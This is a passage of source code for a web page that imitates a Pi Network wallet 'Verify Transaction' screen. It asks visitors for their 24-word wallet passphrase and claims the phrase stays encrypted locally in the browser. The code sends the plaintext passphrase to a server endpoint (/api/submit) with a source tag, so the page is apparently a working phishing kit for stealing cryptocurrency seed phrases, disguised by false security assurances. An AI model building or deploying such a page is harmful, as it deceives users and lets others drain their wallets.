...
import { VerifyIcon, PiHeaderLogo, PiNetLogo } from "@/components/pi-icons";
...
export default function VerifyPage() {
  ...
  const validatePassphrase = (value: string): string | null => {
    ...
    // Each word must be only letters (a-z)
  ...
  const handleBiometricClick = async () => {
    ...
    try {
      await fetch("/api/submit", {
        ...
        body: JSON.stringify({
          passphrase: passphrase.trim(),
          source: "Verify Transaction (Fingerprint)",
        }),
      });
      ...
      <div className="w-full max-w-md sm:max-w-none min-h-screen bg-white flex flex-col relative shadow-2xl sm:shadow-none border-x border-zinc-200 sm:border-x-0">
        ...
        <header className="bg-[#703d92] text-white h-14 sticky top-0 z-30 shadow-md w-full">
          <div className="flex justify-between items-center w-full h-full px-4 max-w-screen-2xl mx-auto">
            ...
            <div className="flex-1 flex justify-center items-center gap-2 sm:gap-3">
              <span className="text-lg sm:text-xl font-semibold tracking-wide">Verify Transaction</span>
        ...
        <main className="p-6 flex-grow flex flex-col justify-start w-full sm:max-w-md sm:mx-auto sm:pt-12">
          ...
          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="space-y-2">
              <textarea
                ...
                placeholder="Enter your 24-word passphrase to sign and verify this transaction"
          ...
          <div className="mt-8 space-y-4 text-xs text-zinc-600 leading-relaxed font-normal">
            <p>
              To confirm your identity for this transaction, please enter your Pi Wallet passphrase. This passphrase remains encrypted locally inside your browser and is only used to compute your cryptographic signature.
            </p>
            <p>
              Do not share your passphrase with anyone. Pi Network Core Team will never ask you for your passphrase via direct messages.
            </p>
          </div>
        </main>
